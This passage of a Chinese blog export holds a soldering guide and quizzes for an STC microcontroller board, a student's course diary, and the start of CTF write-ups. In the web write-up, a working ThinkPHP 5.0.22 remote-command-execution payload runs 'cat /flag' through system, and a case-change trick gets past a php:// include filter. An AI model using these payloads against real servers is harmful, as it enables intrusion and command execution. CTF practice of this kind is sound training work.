<li>用已经加热的烙铁加热焊盘；</li>
<li>送焊锡；</li>
<li>焊锡离开，烙铁离开。</li>
</ol>
<p>训练题：</p>
<ol>
<li>12 M的晶体有（2 ）个引脚。</li>
<li>12 M的晶体焊接时是安装在电路板的哪个位置（ CY1）</li>
<li>判断：12 M晶体的12 M代表晶体厂商。（<em>×</em>）</li>
<li>判断：12 M的晶体焊接时是从电路板反面插入安装。（<em>×</em>）</li>
<li>判断：视频中，12 M晶体焊接是2人协作完成的。（<em>√</em>）</li>
<li>判断：12 M晶体安装在电路板的正面，安装时无方向。（<em>√</em>）</li>
<li> 判断：12 M晶体焊接完之后，不需要立刻剪短它的引脚。（<em>√</em>）</li>
</ol>
<h3 id="2-4-电池座焊接"><a href="#2-4-电池座焊接" class="headerlink" title="2.4 电池座焊接"></a>2.4 电池座焊接</h3><p>电池是维持电路板上的实时时钟的电源，纽扣电池无字的一面为负极、有字的为正极。</p>
<p>电池座有方向，上电池时负极朝下、正极朝上装入电池座。电池座有2个焊点，安装位置为BAT。</p>
<p>焊接步骤：</p>
<ol>
<li>取电池座，将其贴放在电路板的正确位置，而不是将其插入，电池座并非直插式元件，没有过孔。</li>
<li>电池座的焊接在正面，用手指按住电池座使电池座与电路板接触，按压到位，用电烙铁分别对焊盘的2个面加热。</li>
<li>送焊锡。</li>
<li>焊锡离开，烙铁离开。</li>
</ol>
<p>注意：</p>
<ol>
<li> 蜂鸣器与电池座焊接位置是相邻的，应先焊接电池座。若先焊接蜂鸣器，其在电路板上的位置会挡住部分电池座的焊接点。</li>
<li>焊接电池座时，注意是给焊盘的一个面去加热，而不是一个点，再将焊锡送入其结合部位，再移开焊锡，停留1~2秒，等焊锡融化均匀，再移开烙铁。</li>
</ol>
<p>练习题：</p>
<ol>
<li>STC 电路板上电池座里电池的作用是（维持STC电路板上实时时钟的电源 ）</li>
<li>电池座应安装在STC电路板正面的（ BAT ）位置。</li>
<li>电池座的焊接为什么需要在蜂鸣器的焊接之前完成？（焊接完的蜂鸣器会挡住部分电池座的焊接点）</li>
<li>电池座焊接完后，如何安装电池 ？（将有字的一面朝上，无字的一面朝下卡进电池座）</li>
<li>判断：蜂鸣器与电池座位置靠近，先焊接蜂鸣器再焊接电池座。（<em>×</em> ）</li>
<li>判断：电池座焊接时，应将其引脚在电路板的正面的正确位置插入。（ <em>×</em>）</li>
<li>判断：电池座是没有直插引脚，电路板上也没有电池座引脚过孔。（<em>√</em> ）</li>
<li>判断：焊接电池座时，是将其贴放在电路板的正确位置，而不是将其插入，因为它并非直插式元件，没有过孔。 （ <em>√</em>）</li>
<li>判断：焊接电池座时，注意是给焊盘的一个面去加热，而不是一个点，再将焊锡送入其结合部位，再移开焊锡，停留1~2秒，等焊锡融化均匀，再移开烙铁。（<em>√</em> ）</li>
<li>判断：电池有正负极，无字的一面是正极，有字的一面是负极。    （<em>×</em> ）</li>
</ol>
<h3 id="2-5-无源蜂鸣器焊接"><a href="#2-5-无源蜂鸣器焊接" class="headerlink" title="2.5 无源蜂鸣器焊接"></a>2.5 无源蜂鸣器焊接</h3><p>无源蜂鸣器，共2个焊点，无方向，有正负极，正面插入安装。</p>
<p>为养成好习惯，应将蜂鸣器的正负号对应电路板上器件位置的正负号。安装位置在BZ。</p>
<p> 焊接步骤：</p>
<ol>
<li>将蜂鸣器插入STC电路板的正确位置，用手指按住无源蜂鸣器的上方使无源蜂鸣器与电路板接触紧密；</li>
<li>翻转电路板至反面，稳定电路板；</li>
<li>用已经加热的烙铁加热焊盘（共2个）；</li>
<li>送焊锡；</li>
<li>焊锡离开，烙铁离开。</li>
<li>焊接完后，直接剪掉过长的引脚。</li>
</ol>
<p>训练题：</p>
<ol>
<li>关于视频中无源蜂鸣器的焊接，说法正确的是？（多人协助完成焊接 ）</li>
<li>焊接无源蜂鸣器时，有（2 ）个焊点？</li>
<li>视频中，如何处理无源蜂鸣器焊接完后过长的引脚？（焊接完后，直接剪掉过长的引脚 ）</li>
<li>无源蜂鸣器在电路板的（反面 ）焊接。</li>
<li>无源蜂鸣器焊接在电路板的（ BZ）位置</li>
<li>焊接无源蜂鸣器时，要注意的哪些地方?（ABD）<br>A、焊接无源蜂鸣器之前，确保电池座已焊好<br>B、无源蜂鸣器尽管没有方向，但为养成好习惯应参照电路板上的正负号<br>C、无源蜂鸣器无方向，可以在电路板上随便放置<br>D、焊接无源蜂鸣器，最好请同学帮忙稳定电路板，协助完成焊接</li>
<li>判断：无源蜂鸣器有2个引脚，器件上标有正负号，要与电路板上的正负号对应，不能随便焊接。（ <em>×</em>）</li>
<li>判断：无源蜂鸣器无方向，但为养成好习惯，应确保蜂鸣器的正负号与电路板上该器件的位置指示的正负号一致。(<em>√</em> ）</li>
</ol>
<h3 id="2-6-数码管焊接"><a href="#2-6-数码管焊接" class="headerlink" title="2.6 数码管焊接"></a>2.6 数码管焊接</h3><p>学习板上的数码管有2个，是有方向的，正面插入安装，共24个焊点。</p>
<p>安装位置在电路板的右上角 LED 1和 LED 2。</p>
<p> 焊接步骤：</p>
<ol>
<li>取一个数码管与安装位置对准（注意数码管的引脚位置是有方向的，数码管上的小数点的位置对准电路板上安装位置的小数点位置），将其6个管脚插入电路板；</li>
<li>取另一个数码管重复第一步；</li>
<li>翻转电路板至反面，稳定电路板；</li>
<li>用已经加热的烙铁加热焊盘；</li>
<li>送焊锡；</li>
<li>焊锡离开，烙铁离开。</li>
</ol>
<p>注意：</p>
<ol>
<li>数码管安装到电路板上之前，应先检查数码管的引脚是否直，若引脚歪斜，用镊子将其掰直。</li>
<li>两个数码管都插入后，检查数码管的小数点是否在下面，确认无误再开始焊接。</li>
</ol>
<p>训练题：</p>
<ol>
<li>一个数码管有（ 12 ）个引脚</li>
<li>数码管在电路板上的正确摆放位置是（插放在电路板的正面，小数点朝下 ）</li>
<li>数码管的焊接，总共有多少个焊点（ 24）</li>
<li>数码管焊接时要注意哪些地方（ABCDE ）？<br>A、数码管安装在电路板的正面，而不是反面<br>B、在把数码管安装到电路板上之前，先检查数码管的引脚是否弯曲。<br>C、数码管有方向，不能插反了，数码管的小数点朝下面<br>D、2个数码管插入后，再检查是否有插反的<br>E、2个数码管插入后，再将2个数码管往下按到位</li>
<li>判断：一个数码管有12个引脚，焊接安装时是有方向的，数码管上的小数点是在右下方。（ <em>√</em>）</li>
<li>判断：把一个数码管插入电路板上后，焊接完成后再插入另一个数码管，再次焊接。（ <em>×</em>）</li>
<li>判断：数码管安放在电路板上，其小数点朝上。（ <em>×</em>）</li>
<li>判断：一个数码管有8个引脚，把其插入电路板是有方向的。（ <em>×</em>）</li>
<li>判断：数码管焊接之前，可用镊子直接将其所有引脚弄竖直。（ <em>√</em>）</li>
</ol>
<h3 id="2-7-红外发射管焊接"><a href="#2-7-红外发射管焊接" class="headerlink" title="2.7 红外发射管焊接"></a>2.7 红外发射管焊接</h3><p>学习板上的红外发射管有1个，是有方向的，同时还有正负极（长的引脚为正极、短的引脚为负极）之分。</p>
<p>正面插入安装，2个焊点。安装位置在电路板的左上角 IR_T 。</p>
<p>焊接步骤：</p>
<ol>
<li>取红外发射管，将其插入电路板上相应的安装位置（注意红外发射管两个引脚是有正负的，将其正极的引脚插入带有正号的焊盘中），不要将其插入到底，2个引脚需要留2~4 mm（不要把引脚完全插入焊盘）。</li>
<li>检查红外发射管的安装位置、方向是否正确；</li>
<li>2个引脚距离板面2~4 mm处将其掰倒；</li>
<li>另一人协作，按住红外发射管，将电路板翻转，稳定电路板；</li>
<li>当烙铁加热后，用烙铁的刀面给焊盘和接触的管脚加热；</li>
<li>送焊锡；</li>
<li>焊锡离开，烙铁离开。</li>
</ol>
<p>注意：红外发射管需卧置于板面，将红外发射管的<strong>长脚一端</strong>从正面对着电路板左上角处的 <strong>IR-T 的 “+”</strong> ，<strong>短脚一端</strong>对着<strong>IR-T 的 “-”</strong> ，插到底，然后将其拉出一点点，再将其引脚向板子上合适的方向弯曲 90 °，让其倒置在学习板上。</p>
<h3 id="2-8-红外接收管焊接"><a href="#2-8-红外接收管焊接" class="headerlink" title="2.8 红外接收管焊接"></a>2.8 红外接收管焊接</h3><p>学习板上的红外接收管有1个，是有方向的。</p>
<p>正面插入安装（红外接收管突起的一面与电路板IR-R符号突起方向一致，将其按下到最底的位置）</p>
<p>红外接收管是3个焊点，安装位置在电路板的左上角IR_R。</p>
<p>焊接步骤：</p>
<ol>
<li><p>取红外接收器，将其插入电路板上正确的安装位置，注意红外接收器的三个引脚是有方向的，插入时要把它的圆形凸起部分朝电路板外面，如图1-3-8所示；</p>
</li>
<li><p>检查红外接收管的安装位置、方向是否正确；</p>
</li>
<li><p>另一人协作，按住红外接收管，将电路板翻转，稳定电路板。</p>
</li>
<li><p>当烙铁加热后，用烙铁的刀面给焊盘和接触的管脚加热；</p>
</li>
<li><p>送焊锡；</p>
</li>
<li><p>焊锡离开，烙铁离开；</p>
</li>
<li><p>剪去多余的引脚。</p>
</li>
</ol>
<h3 id="2-9-霍尔传感器焊接"><a href="#2-9-霍尔传感器焊接" class="headerlink" title="2.9 霍尔传感器焊接"></a>2.9 霍尔传感器焊接</h3><p>霍尔传感器有1个，是有方向的，正面插入安装，梯形凸起部分朝电路板外面。</p>
<p>它共3个焊点，安装在电路板的左上角HALL。</p>
<p>焊接步骤：</p>
<ol>
<li>取一个霍尔传感器，将其插入电路板的相应位置，并检查其安装位置与方向2是否正确方向；（正面插入、梯形凸起部分朝电路板外面）</li>
<li>另一人协作，按住霍尔传感器，将学习板翻转，稳定学习板；</li>
<li>当烙铁加热后，用烙铁的刀面给焊盘和接触的脚加热；</li>
<li>送焊锡；</li>
<li>焊锡离开，烙铁离开；</li>
<li>剪去多余的引脚。</li>
</ol>
<p>注意：</p>
<ol>
<li>霍尔传感器安装是有方向的，按其黑色梯型窄边方向与STC学习板上HALL位置处窄边的方向一致的插入，不要插到最底，高度与红外发射管同高或略低一点的高度即可。</li>
<li>焊接时注意，几个焊点比较靠近，注意焊接时，焊锡不要挨到一起。</li>
</ol>
<h3 id="2-10-温度传感器焊接"><a href="#2-10-温度传感器焊接" class="headerlink" title="2.10 温度传感器焊接"></a>2.10 温度传感器焊接</h3><p>温度传感器（热敏电阻）有1个，无方向，正面插入安装，2个焊点。安装位置在电路板上的数码管下方Rt处。</p>
<p>焊接步骤：</p>
<ol>
<li>取温度传感器（热敏电阻），将其正面插入电路板的Rt处（引脚要留3~5 mm，不要把引脚完全插入焊盘）；</li>
<li>将电路板翻转到反面，稳定电路板；</li>
<li>烙铁加热后，用烙铁的刀面给焊盘和接触的脚加热；</li>
<li>送焊锡；</li>
<li>焊锡离开，烙铁离开；</li>
<li>剪去多余的引脚。</li>
</ol>
<p>注意：</p>
<ol>
<li>温度传感器的安装高度与数码管相同，或者稍稍低于数码管，距离学习板约5 mm的高度，如图1-3-10所示。</li>
<li>焊接时注意，几个焊点比较靠近，注意焊接时，焊锡不要挨到一起。</li>
</ol>
<h3 id="2-11-光敏传感器焊接"><a href="#2-11-光敏传感器焊接" class="headerlink" title="2.11 光敏传感器焊接"></a>2.11 光敏传感器焊接</h3><p>光敏传感器（光敏电阻）有1个，无方向，正面插入安装，2个焊点。安装位置在电路板上的数码管下方Rop处。</p>
<p>焊接步骤：</p>
<ol>
<li>取一个光敏电阻，将其插入正确位置，其引脚要留2-4 mm（不要把引脚完全插入焊盘）；</li>
<li>将电路板翻转到反面，稳定电路板；</li>
<li>烙铁加热后，用烙铁的刀面给焊盘和接触的脚加热；</li>
<li>送焊锡；</li>
<li>焊锡离开，烙铁离开；</li>
<li>剪去多余的引脚。</li>
</ol>
<p>注意：</p>
<ol>
<li>光敏电阻没有正负极性之分，可以任意方向将其插入Rop处，注意不要全部按压到底，高度比之前焊接完的热敏电阻矮一点点（如图1-3-10所示），小心的翻转到板子背面，保持其距离不变，再开始焊接。</li>
<li>焊接时注意，几个焊点比较靠近，注意焊接时，焊锡不要挨到一起。</li>
</ol>
<h3 id="2-12-振动传感器焊接"><a href="#2-12-振动传感器焊接" class="headerlink" title="2.12 振动传感器焊接"></a>2.12 振动传感器焊接</h3><p>振动传感器有1个，有方向，正面插入安装，2个焊点。安装位置在电路板上的数码管下方SV 处。</p>
<p>焊接步骤：</p>
<ol>
<li>取一个振动传感器，将其插入电路板的正确位置，粗的一脚在SV 左边，细的一脚在SV 右边（如图1-3-11所示），且引脚要留3~4 mm（不要把引脚完全插入焊盘）；</li>
<li>将振动传感器朝电路板外的方向压倒并用手指压住，电路板翻转到反面，稳定电路板；</li>
<li>当洛铁加热后，先用电烙铁对插入硬线的焊盘进行焊接，然后回到电路板正面，用镊子把软线夹住往上提1-2 mm，再把电路板反过来对插入软线的焊盘进行焊接；</li>
<li>剪去多余的引脚。</li>
</ol>
<p>注意：</p>
<ol>
<li><p>焊接时注意振动传感器的两个引脚的材质是不同的，一个是软线，另一个是硬线。</p>
</li>
<li><p>振动传感器在学习板上处于横卧位，需在焊接之前将其粗的一脚掰成90°，然后再按正确方向插入。</p>
</li>
</ol>
<p>软线易断，两线焊锡易粘连。</p>
<h3 id="2-13-32768-Hz晶体2焊接"><a href="#2-13-32768-Hz晶体2焊接" class="headerlink" title="2.13 32768 Hz晶体2焊接"></a>2.13 32768 Hz晶体2焊接</h3><p>学习板上的32768Hz晶振2有1个，是给实时时钟提供基准频率的，无方向，</p>
<p>正面插入安装，2个焊点。安装位置在电路板上最下方CY2处。</p>
<p>焊接步骤：</p>
<ol>
<li>在电路板上的最下面一排找到CY2处，加热焊盘，先给焊盘上少量焊锡，如图1-3-12所示；</li>
<li>再取晶体2，将其插入电路板上相应的安装位置，注意引脚要留2~3mm（不要把引脚完全插入焊盘）；插入后再将其掰倒横卧于板上；</li>
<li>把晶体2朝电路板外侧的方向压倒并用镊子按压住，用烙铁加热长方形贴片焊盘，使焊盘上的锡融化，不能松动镊子。</li>
<li>烙铁移开后，等锡凝固粘住晶振2以后再移开镊子。</li>
<li>把电路板反过来，用烙铁对引脚进行焊接；</li>
<li>送焊锡；焊锡离开，烙铁离开；</li>
<li>剪去多余的引脚。（详见视频“12晶振2焊接”）</li>
</ol>
<p>注意：</p>
<ol>
<li><p>32768Hz晶体在学习板上是处于横卧位（如图1-3-12所示），是将其插入CY2处，再将其掰倒卧于学习板上。</p>
</li>
<li><p>焊接时注意，几个焊点比较靠近，注意焊接时，焊锡不要挨到一起去。</p>
</li>
</ol>
<h3 id="2-14-拓展接口插座焊接"><a href="#2-14-拓展接口插座焊接" class="headerlink" title="2.14 拓展接口插座焊接"></a>2.14 拓展接口插座焊接</h3><p>学习板上增加了一些拓展接口插座。</p>
<p>增加拓展接口插座之后一方面影响电路板的美观，另一方面因插座的高度过高会导致携带不方便，应根据需要自由选择是否将其焊接。</p>
<p>学习板有拓展接口3个，正面安装。安装位置在学习板的EXT、SM、485处。</p>
<p> 焊接步骤：</p>
<ol>
<li>取一个拓展接口插座，把它插入电路板正面上相应的拓展接口插座安装位置并且引脚完全插入焊盘。</li>
<li>把拓展接口插座朝电路板外的方向压倒并用手指压住，把电路板反过来，用电烙铁对每个引脚焊盘进行焊接。</li>
</ol>
<h3 id="2-15-电路板底座安装"><a href="#2-15-电路板底座安装" class="headerlink" title="2.15 电路板底座安装"></a>2.15 电路板底座安装</h3><p>电路板底座安装所需器材：底板（ 1）块，螺丝（ 8）个，六角铜柱（4 ）个，十字起子（ 1）把。</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>小学期日志</title>
    <url>/2021/07/06/%E5%B0%8F%E5%AD%A6%E6%9C%9F%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><h2 id="7-5-星期一"><a href="#7-5-星期一" class="headerlink" title="7.5 星期一"></a>7.5 星期一</h2><p>上午在院楼401听徐老师的动员讲座，不仅让我对单片机有了一些了解且激发了我的学习热情，同时也让我知道了小学期这门课的各种注意事项和课程安排。</p>
<p>下午去参观了机器贴片，然后就看学习板制作和贴片的制作流程的网课，做了对应的题，其他时间就看了凌老师发给我们的一些学习资料。</p>
<p>总结：今天我知道了<code>STC-B</code>学习板采用<code>STC15F2K60S2</code>单片机为核心，以及它所具有的特点和资源，使用它可以做到什么；我们第一个任务就是制作这个学习板，为我们之后的单片机烧录做准备。</p>
<h2 id="7-6-星期二"><a href="#7-6-星期二" class="headerlink" title="7.6 星期二"></a>7.6 星期二</h2><p>继续看如何焊接学习板的视频，以及做相关的测验题，最后考试。</p>
<p>明天制作学习板，计划是：</p>
<ol>
<li>先把拿到的各种元件整理一下；</li>
<li>打开电焊台，调整温度到320 ℃（标志是指示灯变红）；</li>
<li>焊接4个按键，焊四个引脚</li>
<li>焊接晶体1，焊两个引脚</li>
<li>焊接电池座，摆好位置，然后焊前后两个位置</li>
<li>焊接无源蜂鸣器，正负号对应电路板上器件位置的正负号</li>
<li>数码管焊接，小数点的位置对准电路板上安装位置的小数点位置</li>
<li>红外发射管焊接，将红外发射管的<strong>长脚一端</strong>从正面对着电路板左上角处的 <strong>IR-T 的 “+”</strong> ，<strong>短脚一端</strong>对着<strong>IR-T 的 “-”</strong> ，插到底，然后将其拉出一点点，再将其引脚向板子上合适的方向弯曲 90 °，让其倒置在学习板上。</li>
<li>红外接收管焊接，红外接收器的三个引脚是有方向的，插入时要把它的圆形凸起部分朝电路板外面</li>
<li>霍尔传感器焊接，梯形凸起部分朝电路板外面</li>
<li>温度传感器焊接，引脚要留3~5 mm，不要把引脚完全插入焊盘</li>
<li>光敏传感器焊接，引脚要留2-4 mm（不要把引脚完全插入焊盘）</li>
<li>振动传感器焊接，粗的一脚在SV左边，细的一脚在SV右边（如图1-3-11所示），且引脚要留3~4 mm，朝电路板外的方向压倒并用手指压住，用电烙铁对插入硬线的焊盘进行焊接，然后回到电路板正面，镊子把软线夹住往上提1-2 mm，</li>
<li>32768 Hz晶体2焊接，引脚要留2~3mm（不要把引脚完全插入焊盘）；插入后再将其掰倒横卧于板上；</li>
<li>拓展接口插座朝电路板外的方向压倒并用手指压住</li>
<li>最后接上底座。</li>
</ol>
<h2 id="7-7-星期三"><a href="#7-7-星期三" class="headerlink" title="7.7 星期三"></a>7.7 星期三</h2><p>早上听老师讲座，老师讲了单片机的开发环境，Keil 的基本开发流程以及示范，stc-isp烧录示范，回到教室后我通过看视频巩固了这些知识。</p>
<p>下午焊板子，与另一个人一组在同学们的帮助下完成焊接，感觉很好。</p>
<h2 id="7-8-星期四"><a href="#7-8-星期四" class="headerlink" title="7.8 星期四"></a>7.8 星期四</h2><p>下载案例进行测试，发现数码管有问题，拿去送修，老师很快就修好了。</p>
<p>今天测试I、II两类案例，除了一些需要其他设备完成的案例，基本测试完成。</p>
<h2 id="7-9-星期五"><a href="#7-9-星期五" class="headerlink" title="7.9 星期五"></a>7.9 星期五</h2><p>今天，之后的案例开放下载了，对大部分案例进行下载测试。</p>
<p>在测试实时时钟的时候，我的秒数不动，判断是晶体二出现了问题，送去检修，老师今天也修的很快。</p>
<p>在485总线评分系统案例的测试中，从机检测一直没有，只能将它和剩下几个比较复杂的案例留待明天。</p>
<h2 id="7-10-星期六"><a href="#7-10-星期六" class="headerlink" title="7.10 星期六"></a>7.10 星期六</h2><p>今天一早就去询问同学关于485总线评分系统案例的测试，在同学帮助下终于测试成功，只是还是有些不灵敏。</p>
<p>将剩下的RFID读写卡、数据采集等案例也测试完成，至此，所有案例测试完成。</p>
<p>剩下的时间去查看这些案例的工程文件，研究它们是如何编写的。</p>
<h2 id="7-11-星期日"><a href="#7-11-星期日" class="headerlink" title="7.11 星期日"></a>7.11 星期日</h2><p>放假</p>
<h2 id="7-12-星期一"><a href="#7-12-星期一" class="headerlink" title="7.12 星期一"></a>7.12 星期一</h2><p>上午听徐老师的讲座，回到教室之后将两份纸质文件扫描上传。</p>
<p>下午学习工程文件的编写，学习了：</p>
<ol>
<li><p>P0 表示所有的引脚，P0^3 表示P0.3 引脚</p>
</li>
<li><p>P0M1 和 P0M0 一起用来表示引脚的I/O口工作模式：</p>
<ol>
<li>01，设定为推挽输出，默认为1，既可以输出低电平，也可以输出高电平，可以直接驱动功耗不大的数字器件。</li>
<li>11，设定为开漏输出，只能输出低电平，如果要输出高电平必须通过上拉电阻才能实现。就类似于三极管的集电极输出。</li>
<li>00，设定为准双向I/O。</li>
<li>10，仅为输入。</li>
</ol>
</li>
<li><p><code>uchar code arrLed[] = &#123;0x00, 0x01, 0x03, 0x07, 0x0f, 0x1f, 0x3f, 0x7f, 0xff&#125;;</code>设置数组</p>
</li>
<li><p>一些较难找的元件的引脚：</p>
<ul>
<li>p2.4 是振动传感器，若为0，则；</li>
<li>p1.7 是Key3;</li>
<li>p3.3 是Key2;</li>
<li>p3.2 是Key1;</li>
</ul>
</li>
<li><p>数码管P0引脚段选，P2.0-P2.2引脚位选</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">uchar duanxuan[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>&#125;; <span class="comment">//段选信号0-8</span></span><br><span class="line">uchar arrSegSelect[] = &#123;<span class="number">0x3f</span>, <span class="number">0x06</span>, <span class="number">0x5b</span>, <span class="number">0x4f</span>, <span class="number">0x66</span>, <span class="number">0x6d</span>, <span class="number">0x7d</span>, <span class="number">0x07</span>, <span class="number">0x7f</span>, <span class="number">0x6f</span>, <span class="number">0x77</span>, <span class="number">0x7c</span>, <span class="number">0x39</span>, <span class="number">0x5e</span>, <span class="number">0x79</span>, <span class="number">0x71</span>, <span class="number">0x40</span>, <span class="number">0x00</span>&#125;; <span class="comment">//x0-f</span></span><br><span class="line">uchar weixuan[]=&#123;<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x04</span>,<span class="number">0x05</span>,<span class="number">0x06</span>,<span class="number">0x07</span>&#125;;		<span class="comment">//位选信号0-7</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="7-13-星期二"><a href="#7-13-星期二" class="headerlink" title="7.13 星期二"></a>7.13 星期二</h2><p>一整天都在看工程文件，有很多都不会，例如定时器，asm格式的汇编文件编写等等。</p>
<h2 id="7-14-星期三"><a href="#7-14-星期三" class="headerlink" title="7.14 星期三"></a>7.14 星期三</h2><p>上午去听了老师的讲座，然后到工训自习。</p>
<p>下午主要看了在B站直播的立创EDA，这是一个设计PCB板的平台，可以去自主设计也可以和别人去交流技术。</p>
<h2 id="7-15-星期四"><a href="#7-15-星期四" class="headerlink" title="7.15 星期四"></a>7.15 星期四</h2><p>上午实训中期验收，感觉不妙</p>
<p>下午自习，看PCB板视频还有资料里面的源码</p>
<h2 id="9-6-星期一"><a href="#9-6-星期一" class="headerlink" title="9.6 星期一"></a>9.6 星期一</h2><p>今天是小学期下上课的第一天。</p>
<p>上午听讲座，学习 BSP 说明中显示模块函数库 Displayer.lib ，并编写流水灯测试</p>
<p>下午学习 BSP 说明中按键模块 函数库 Key.lib、无源蜂鸣 器函数库 Beep.lib 、音乐模块 函数库 Music.lib </p>
<h2 id="9-7-星期二"><a href="#9-7-星期二" class="headerlink" title="9.7 星期二"></a>9.7 星期二</h2><p>上午学习了霍尔传感器模 块函数库 Hall.lib 、振动传感器模 块函数库 Vib.lib 、步进电机控制 模块函数库 StepMotor.lib </p>
<p>下午学习模数转换模块 函数库 ADC.lib</p>
<h2 id="9-8-星期三"><a href="#9-8-星期三" class="headerlink" title="9.8 星期三"></a>9.8 星期三</h2><p>开始设想自己的创新大作业选题</p>
<p>上午学习异步通信模块 函数库 Uart1.lib </p>
<p>下午学习EXT 模块函数 库（电子秤、超声波测距、编码器、 PWM）EXT.lib </p>
<h2 id="9-9-星期四"><a href="#9-9-星期四" class="headerlink" title="9.9 星期四"></a>9.9 星期四</h2><p>学习 BSP 说明中红外模块函 数库 IR.lib、实时时钟模 块函数库 DS1302.lib</p>
<p>因为选题重复，需要再加以修改</p>
<h2 id="9-10-星期五"><a href="#9-10-星期五" class="headerlink" title="9.10 星期五"></a>9.10 星期五</h2><p>学习 BSP 说明中非易失性存 储器模块函数库M24C02.lib、非易失性存 储器模块函数库M24C02.lib</p>
<p>最终选题定为霍尔元件测速。</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界pwn新手区</title>
    <url>/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="攻防世界pwn新手区"><a href="#攻防世界pwn新手区" class="headerlink" title="攻防世界pwn新手区"></a>攻防世界pwn新手区</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>web学不下去了</p>
<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h3><p>ida打开附件，查看main函数</p>
<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221215647.png" alt="image-20210905221215647"></p>
<p>如果if条件满足，可以执行函数得到flag</p>
<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221233918.png" alt="image-20210905221233918"></p>
<p>栈溢出，通过read函数读unk变量覆盖dword变量</p>
<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221314044.png" alt="image-20210905221314044"></p>
<p>所以脚本如下，四个字节是unk覆盖是p64，decode是为了不报错</p>
<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221122958.png" alt="image-20210905221122958"></p>
<p>执行结果</p>
<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221135736.png" alt="image-20210905221135736"></p>
<p>得到flag</p>
<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221153138.png" alt="image-20210905221153138"></p>
<h3 id="Level0"><a href="#Level0" class="headerlink" title="Level0"></a>Level0</h3>]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界web进阶区</title>
    <url>/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="攻防世界web进阶区"><a href="#攻防世界web进阶区" class="headerlink" title="攻防世界web进阶区"></a>攻防世界web进阶区</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>攻防世界进阶区，题量多，慢慢耍。</p>
<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>第一个页面是index.php，每个网站都有，本题会跳转到1.php，所以抓包即可得到</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210809233134941.png" alt="image-20210809233134941"></p>
<h3 id="Training-www-Robots"><a href="#Training-www-Robots" class="headerlink" title="Training-www-Robots"></a>Training-www-Robots</h3><p>根据提示访问robots.txt，看到如下页面，访问/f10g.php即可得到flag。</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812141706915.png" alt="image-20210812141706915"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812141749360.png" alt="image-20210812141749360"></p>
<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>根据提示这道题是php rce漏洞，thinkphp5.0.22版本，这个是已经披露的漏洞，找到它的利用方式。</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812160017327.png" alt="image-20210812160017327"></p>
<p><code>payload:/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></p>
<p><code>vars[1][]</code>后面跟的是任意执行的命令行<code>cat /flag</code>，可以先<code>find / -name flag</code>找到flag文件<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812182303546.png" alt="image-20210812182303546"></p>
<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>代码过滤了<code>php://</code>协议，这里可以使用大写的<code>PHP://</code>来绕过，利用page参数的payload:</p>
<ol>
<li>PHP://input，然后POST <code>&lt;?php phpinfo();?&gt;</code></li>
